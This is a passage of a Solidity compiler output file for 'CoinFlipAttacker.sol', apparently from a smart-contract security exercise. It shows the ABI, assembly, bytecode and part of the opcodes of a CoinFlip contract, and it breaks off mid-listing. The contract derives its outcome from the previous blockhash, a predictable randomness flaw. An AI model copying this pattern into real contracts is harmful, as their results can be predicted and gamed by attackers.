{
	"contract/security/CoinFlipAttacker.sol": {
		"CoinFlip": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "consecutiveWins",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "bool",
							"name": "_guess",
							"type": "bool"
						}
					],
					"name": "flip",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/security/CoinFlipAttacker.sol\":255:981  contract CoinFlip {\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/CoinFlipAttacker.sol\":382:459  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contract/security/CoinFlipAttacker.sol\":365:459  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"contract/security/CoinFlipAttacker.sol\":466:519  constructor() public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":512:513  0 */\n  0x00\n    /* \"contract/security/CoinFlipAttacker.sol\":494:509  consecutiveWins */\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":494:513  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":255:981  contract CoinFlip {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/CoinFlipAttacker.sol\":255:981  contract CoinFlip {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/CoinFlipAttacker.sol\":525:978  function flip(bool _guess) public returns (bool) {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      iszero\n      iszero\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/CoinFlipAttacker.sol\":309:339  uint256 public consecutiveWins */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/CoinFlipAttacker.sol\":525:978  function flip(bool _guess) public returns (bool) {\r... */\n    tag_7:\n        /* \"contract/security/CoinFlipAttacker.sol\":568:572  bool */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":581:599  uint256 blockValue */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":620:639  block.number.sub(1) */\n      tag_11\n        /* \"contract/security/CoinFlipAttacker.sol\":637:638  1 */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":620:632  block.number */\n      number\n        /* \"contract/security/CoinFlipAttacker.sol\":620:636  block.number.sub */\n      tag_12\n      swap1\n        /* \"contract/security/CoinFlipAttacker.sol\":620:639  block.number.sub(1) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_11:\n        /* \"contract/security/CoinFlipAttacker.sol\":610:640  blockhash(block.number.sub(1)) */\n      blockhash\n        /* \"contract/security/CoinFlipAttacker.sol\":602:641  uint256(blockhash(block.number.sub(1))) */\n      0x00\n      shr\n        /* \"contract/security/CoinFlipAttacker.sol\":581:641  uint256 blockValue = uint256(blockhash(block.number.sub(1))) */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":666:676  blockValue */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":654:662  lastHash */\n      sload(0x01)\n        /* \"contract/security/CoinFlipAttacker.sol\":654:676  lastHash == blockValue */\n      eq\n        /* \"contract/security/CoinFlipAttacker.sol\":650:703  if (lastHash == blockValue) {\r... */\n      iszero\n      tag_13\n      jumpi\n        /* \"contract/security/CoinFlipAttacker.sol\":687:695  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contract/security/CoinFlipAttacker.sol\":650:703  if (lastHash == blockValue) {\r... */\n    tag_13:\n        /* \"contract/security/CoinFlipAttacker.sol\":722:732  blockValue */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":711:719  lastHash */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":711:732  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":739:755  uint256 coinFlip */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":758:780  blockValue.div(FACTOR) */\n      tag_14\n        /* \"contract/security/CoinFlipAttacker.sol\":773:779  FACTOR */\n      sload(0x02)\n        /* \"contract/security/CoinFlipAttacker.sol\":758:768  blockValue */\n      dup4\n        /* \"contract/security/CoinFlipAttacker.sol\":758:772  blockValue.div */\n      tag_15\n      swap1\n        /* \"contract/security/CoinFlipAttacker.sol\":758:780  blockValue.div(FACTOR) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_14:\n        /* \"contract/security/CoinFlipAttacker.sol\":739:780  uint256 coinFlip = blockValue.div(FACTOR) */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":787:796  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":811:812  1 */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":799:807  coinFlip */\n      dup3\n        /* \"contract/security/CoinFlipAttacker.sol\":799:812  coinFlip == 1 */\n      eq\n        /* \"contract/security/CoinFlipAttacker.sol\":799:827  coinFlip == 1 ? true : false */\n      tag_16\n      jumpi\n        /* \"contract/security/CoinFlipAttacker.sol\":822:827  false */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":799:827  coinFlip == 1 ? true : false */\n      jump(tag_17)\n    tag_16:\n        /* \"contract/security/CoinFlipAttacker.sol\":815:819  true */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":799:827  coinFlip == 1 ? true : false */\n    tag_17:\n        /* \"contract/security/CoinFlipAttacker.sol\":787:827  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":848:854  _guess */\n      dup5\n        /* \"contract/security/CoinFlipAttacker.sol\":840:854  side == _guess */\n      iszero\n      iszero\n        /* \"contract/security/CoinFlipAttacker.sol\":840:844  side */\n      dup2\n        /* \"contract/security/CoinFlipAttacker.sol\":840:854  side == _guess */\n      iszero\n      iszero\n      eq\n        /* \"contract/security/CoinFlipAttacker.sol\":836:973  if (side == _guess) {\r... */\n      iszero\n      tag_18\n      jumpi\n        /* \"contract/security/CoinFlipAttacker.sol\":865:880  consecutiveWins */\n      0x00\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":865:882  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      0x01\n      add\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":898:902  true */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":891:902  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_10)\n        /* \"contract/security/CoinFlipAttacker.sol\":836:973  if (side == _guess) {\r... */\n    tag_18:\n        /* \"contract/security/CoinFlipAttacker.sol\":943:944  0 */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":925:940  consecutiveWins */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":925:944  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":960:965  false */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":953:965  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":525:978  function flip(bool _guess) public returns (bool) {\r... */\n    tag_10:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contract/security/CoinFlipAttacker.sol\":309:339  uint256 public consecutiveWins */\n    tag_9:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1274:1408  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_12:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1332:1339  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      tag_21\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1362:1363  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1365:1366  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1361  sub */\n      tag_22\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      jump\t// in\n    tag_21:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1351:1401  return sub(a, b, \"SafeMath: subtraction overflow\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1274:1408  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3033:3163  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_15:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3091:3098  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      tag_24\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3121:3122  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3124:3125  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a206469766973696f6e206279207a65726f000000000000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3120  div */\n      tag_25\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      jump\t// in\n    tag_24:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3110:3156  return div(a, b, \"SafeMath: division by zero\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3033:3163  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1692:1879  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_22:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1778:1785  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1810:1811  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1805:1806  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1805:1811  b <= a */\n      gt\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1813:1825  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1797:1826  require(b <= a, errorMessage) */\n      swap1\n      tag_27\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_28:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_30\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_28)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_31\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_31:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_27:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1836:1845  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1852:1853  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1848:1849  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1848:1853  a - b */\n      sub\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1836:1853  uint256 c = a - b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1871:1872  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1864:1872  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1692:1879  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3638:3976  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_25:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3724:3731  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3821:3822  0 */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3817:3818  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3817:3822  b > 0 */\n      gt\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3824:3836  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3809:3837  require(b > 0, errorMessage) */\n      swap1\n      tag_33\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_34:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_36\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_34)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_37\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_37:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_33:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3847:3856  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3863:3864  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3859:3860  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3859:3864  a / b */\n      dup2\n      tag_38\n      jumpi\n      invalid\n    tag_38:\n      div\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3847:3864  uint256 c = a / b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3968:3969  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3961:3969  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3638:3976  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220d74fc45c4573c64c77ffcc7c1d298b625b36505fa39c1c1448ef7b4c37bdfa6a64736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103948061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d714610081575b600080fd5b6100696004803603602081101561005157600080fd5b8101908080351515906020019092919050505061009f565b60405180821515815260200191505060405180910390f35b61008961013e565b6040518082815260200191505060405180910390f35b6000806100b660014361014490919063ffffffff16565b4060001c90508060015414156100cb57600080fd5b8060018190555060006100e96002548361018e90919063ffffffff16565b90506000600182146100fc5760006100ff565b60015b9050841515811515141561012a57600080815480929190600101919050555060019350505050610139565b60008081905550600093505050505b919050565b60005481565b600061018683836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506101d8565b905092915050565b60006101d083836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250610298565b905092915050565b6000838311158290610285576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561024a57808201518184015260208101905061022f565b50505050905090810190601f1680156102775780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b60008083118290610344576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b838110156103095780820151818401526020810190506102ee565b50505050905090810190601f1680156103365780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b50600083858161035057fe5b04905080915050939250505056fea2646970667358221220d74fc45c4573c64c77ffcc7c1d298b625b36505fa39c1c1448ef7b4c37bdfa6a64736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x394 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x81 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x69 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD ISZERO ISZERO SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x9F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x89 PUSH2 0x13E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xB6 PUSH1 0x1 NUMBER PUSH2 0x144 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xCB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH2 0xE9 PUSH1 0x2 SLOAD DUP4 PUSH2 0x18E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xFC JUMPI PUSH1 0x0 PUSH2 0xFF JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x12A JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x139 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x186 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1E DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A207375627472616374696F6E206F766572666C6F770000 DUP2 MSTORE POP PUSH2 0x1D8 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1D0 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1A DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x536166654D6174683A206469766973696F6E206279207A65726F000000000000 DUP2 MSTORE POP PUSH2 0x298 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0x285 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x24A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x22F JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x277 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP4 GT DUP3 SWAP1 PUSH2 0x344 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x309 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2EE JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x336 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 